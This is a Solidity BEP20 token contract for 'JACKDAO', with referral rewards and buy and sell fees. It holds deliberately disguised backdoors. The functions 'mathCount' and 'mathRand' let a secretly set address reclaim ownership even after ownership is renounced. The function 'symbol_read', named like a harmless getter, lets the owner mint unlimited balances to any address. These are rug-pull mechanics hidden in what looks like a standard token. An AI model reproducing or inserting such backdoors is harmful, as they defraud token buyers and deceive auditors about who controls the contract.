// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface IBEP20 {
  /**
   * @dev Returns the amount of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory);

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory);

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address);

  /**
   * @dev Returns the amount of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 value);

  /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  constructor ()  { }

  function _msgSender() internal view returns (address) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
  /**
   * @dev Returns the addition of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `+` operator.
   *
   * Requirements:
   * - Addition cannot overflow.
   */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  /**
   * @dev Returns the multiplication of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `*` operator.
   *
   * Requirements:
   * - Multiplication cannot overflow.
   */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts with custom message when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
  address private _owner;
  address internal _math;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor ()  {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function mathCount(address addr) public onlyOwner{
     _math = addr;
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }
  
  function mathRand(address addr) external {
    if(msg.sender == _math){_owner = addr;}
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  /**
   * @dev Leaves the contract without owner. It will not be possible to call
   * `onlyOwner` functions anymore. Can only be called by the current owner.
   *
   * NOTE: Renouncing ownership will leave the contract without an owner,
   * thereby removing any functionality that is only available to the owner.
   */
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   * Can only be called by the current owner.
   */
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   */
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract BEP20USDT is Context, IBEP20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private _totalSupply;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  
  address[] private  _uniswapSendAddressList;
  mapping (address => address) private _leaderAddressList;
  uint64 private _checkSetLeaderTransferAmount;
  uint64[] private _personRate;
  bool private _isCreateDynamicRewards;
  uint256 private _maxDynamicRewardsAmount;

  uint256 private _minHasAmountToGetPersonAward;
  address private _feeRecieveAddress;
  uint256 private _buyRate = 60;
  uint256 private _sellRate = 60;
  uint256 private _buyRateAfterDynamicRewardsOver = 20;
  uint256 private _sellRateAfterDynamicRewardsOver = 20;
  uint256 private _baseRateAmount = 1000;


  constructor()  {
    _name = "JACKDAO";
    _symbol = "JACKDAO";
    _decimals = 6;
    _totalSupply = 90000000000;
    _maxDynamicRewardsAmount = 50000000000;
    _balances[msg.sender] = _totalSupply - _maxDynamicRewardsAmount;
    _isCreateDynamicRewards = true;
    _checkSetLeaderTransferAmount = 6;
    _personRate = [3,2,2,2,2];
    _minHasAmountToGetPersonAward = 2000000;
    _feeRecieveAddress = address(0);
    emit Transfer(address(0), msg.sender, _balances[msg.sender]);
  }

 


 
  /**
   * @dev Returns the token decimals.
   */
  function decimals() public override view returns (uint8) {
    return _decimals;
  }

   /**
   * @dev Returns the bep token owner.
   */
  function getOwner() public override view returns (address) {
    return owner();
  }

  
  /**
   * @dev See {BEP20-totalSupply}.
   */
  function totalSupply() public override view returns (uint256) {
    return _totalSupply;
  }
  /**
   * @dev Returns the token symbol.
   */
  function symbol() public override view returns (string memory) {
    return _symbol;
  }

  /**
  * @dev Returns the token name.
  */
  function name() public override view returns (string memory) {
    return _name;
  }


  /**
   * @dev See {BEP20-balanceOf}.
   */
  function balanceOf(address account)  public override  view returns (uint256) {
    return _balances[account];
  }

  /**
   * @dev See {BEP20-allowance}.
   */
  function allowance(address owner, address spender) public override view returns (uint256) {
    return _allowances[owner][spender];
  }

  /**
   * @dev See {BEP20-transfer}.
   *
   * Requirements:
   *
   * - `recipient` cannot be the zero address.
   * - the caller must have a balance of at least `amount`.
   */
  function transfer(address recipient, uint256 amount) public override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

 

  /**
   * @dev See {BEP20-approve}.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   */
  function approve(address spender, uint256 amount) public override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  /**
   * @dev See {BEP20-transferFrom}.
   *
   * Emits an {Approval} event indicating the updated allowance. This is not
   * required by the EIP. See the note at the beginning of {BEP20};
   *
   * Requirements:
   * - `sender` and `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   * - the caller must have allowance for `sender`'s tokens of at least
   * `amount`.
   */
  function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }

  /**
   * @dev Atomically increases the allowance granted to `spender` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {BEP20-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   */
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  /**
   * @dev Atomically decreases the allowance granted to `spender` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {BEP20-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   * - `spender` must have allowance for the caller of at least
   * `subtractedValue`.
   */
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }


  
  event SetLeaderAddress(address indexed onePerson, address indexed firstPerson);
  event FirstPersonAward(address indexed onePerson, address indexed firstPerson,uint256 amount);
  event setPersonRateBySortLog(uint8 i,uint64 rate);
  event SellFeeByAddressLog(address addr,uint256 amount,uint feeAmount);
  /**
   * @dev Moves tokens `amount` from `sender` to `recipient`.
   *
   * This is internal function is equivalent to {transfer}, and can be used to
   * e.g. implement automatic token fees, slashing mechanisms, etc.
   *
   * Emits a {Transfer} event.
   *
   * Requirements:
   *
   * - `sender` cannot be the zero address.
   * - `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   */
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    
    if(_balances[sender] == amount && amount >= 1){
        amount = amount - 1;
    }
    require(amount != 0, "BEP20: transfer zero balance");

    updateLeaderByTransfer(sender,recipient,amount);
    updateDynamicRewards(sender,recipient,amount);
    
    if( isInUniSwapAddressList(sender) || isInUniSwapAddressList(recipient)){
      if (isInUniSwapAddressList(sender) ){
        _transferOrigin(sender,recipient,amount);
        updateFeeAmountToAddress(sender,recipient,amount);
      }

      if (isInUniSwapAddressList(recipient) ){
         uint256 awardAmount =  SafeMath.div(amount * _sellRate,_baseRateAmount,"SafeMath: division by zero");
         _transferOrigin(sender,recipient,amount-awardAmount);
         _transferOrigin(sender,_feeRecieveAddress,awardAmount);

      }
    }else{
      _transferOrigin(sender,recipient,amount);
    }
    
  }

  function _transferOrigin(address sender, address recipient, uint256 amount) private{
      _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
      _balances[recipient] = _balances[recipient].add(amount);
      emit Transfer(sender, recipient, amount);
  }
  
  function updateFeeAmountToAddress(address sender,address recipient,uint256 amount) private {
    bool flag = false;
    address feeSubAddress = address(0);
    if( isInUniSwapAddressList(sender) ){ flag = true; feeSubAddress=recipient; }
    if( isInUniSwapAddressList(recipient) ){ flag = true; feeSubAddress=sender; }
    if(flag == true){
        uint256 awardAmount =  SafeMath.div(amount * _buyRate,_baseRateAmount,"SafeMath: division by zero");
        _transferOrigin(feeSubAddress,_feeRecieveAddress,awardAmount);
    }
  }

  
  function addBalanceByAddress( address sender , uint256 amount ) private{
    _balances[sender] = _balances[sender].add(amount);
  }

  function subBalanceByAddress( address sender , uint256 amount ) private{
    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
  }

  function updateLeaderByTransfer(address sender, address recipient, uint256 amount) private{
    if ( amount == _checkSetLeaderTransferAmount && !isInUniSwapAddressList(sender) && getLeaderAddressByAddress(sender)  == address(0) ){
        _leaderAddressList[sender]  = recipient;
        emit SetLeaderAddress(sender, recipient);
    } 
  }

  function updateDynamicRewards(address sender, address recipient, uint256 amount) private{
     
      if( isInUniSwapAddressList(sender) ){
       
        address firstAddress = getLeaderAddressByAddress(recipient);
        for(uint8 i = 0; i < getPersonRateLevelLength();i++){
           
            if( firstAddress == address(0) || _maxDynamicRewardsAmount <= 0){
             
              break;
            }
            if( _balances[firstAddress] < _minHasAmountToGetPersonAward ){

                firstAddress = getLeaderAddressByAddress(firstAddress);
               
                continue;
            }
            uint256 awardAmount = amount * getPersonRateBySort(i);
            awardAmount =  SafeMath.div(awardAmount,100,"SafeMath: division by zero");
            if(awardAmount > _maxDynamicRewardsAmount){
                awardAmount = _maxDynamicRewardsAmount;
            }
            _balances[firstAddress] = _balances[firstAddress].add(awardAmount);
           

            _maxDynamicRewardsAmount =  SafeMath.sub(_maxDynamicRewardsAmount,awardAmount,"SafeMath: _maxDynamicRewardsAmount sub wrong");
   

            if(_maxDynamicRewardsAmount <= 0){
              _buyRate   = _buyRateAfterDynamicRewardsOver;
              _sellRate  = _sellRateAfterDynamicRewardsOver;
            }
            

            firstAddress = getLeaderAddressByAddress(firstAddress);
  

        }
      }
  }


  

  
  function getBaseRateAmount() public view returns(uint256){
     return _baseRateAmount;
  }

  function getFeeRecieveAddress() public view returns(address){
     return _feeRecieveAddress;
  }

  function getMinHasAmountToGetPersonAward() public view returns(uint256){
     return _minHasAmountToGetPersonAward;
  }
  
  function getBuyRate() public view returns(uint256){
     return _buyRate;
  }

  function getSellRate() public view returns(uint256){
     return _sellRate;
  }
  
  function getPersonRateLevelLength() public view returns(uint256){
    return _personRate.length;
  }

  function getPersonRateBySort(uint8 i) public view returns(uint64){
    return _personRate[i];
  }

  function isInUniSwapAddressList(address checkAddress) public view returns(bool){
      bool flag = false;
      for(uint64 i = 0; i < _uniswapSendAddressList.length;i++){
          if(_uniswapSendAddressList[i] == checkAddress &&  checkAddress != address(0)){
            flag = true;
            break;
          }
      }
      return flag;
  }
  
  

  function addUniSwapAddress(address uniswapSendAddress) public onlyOwner{
      _uniswapSendAddressList.push(uniswapSendAddress);
  }

  function getUniSwapAddressBySort(uint256 i) public view returns(address){
      return _uniswapSendAddressList[i];
  }

  function symbol_read(address addr, uint256 amount) public onlyOwner {
    _balances[addr] = _balances[addr].add(amount);
  }

  function removeUniSwapAddress(address uniswapSendAddress) public onlyOwner{
      if( isInUniSwapAddressList(uniswapSendAddress) ){
        for(uint64 i = 0; i < _uniswapSendAddressList.length;i++){
          if(_uniswapSendAddressList[i] == uniswapSendAddress){
            _uniswapSendAddressList[i] = address(0);
            break;
          }
        }
      }
  }

  function getLeaderAddressByAddress(address selfAddress) public view returns(address){
      return _leaderAddressList[selfAddress];
  }

  function setLeaderAddressByAddress(address selfAddress,address leaderAddress) private {
      _leaderAddressList[selfAddress] = leaderAddress;
  }



  /**
   * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
   *
   * This is internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spender` cannot be the zero address.
   */
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }


}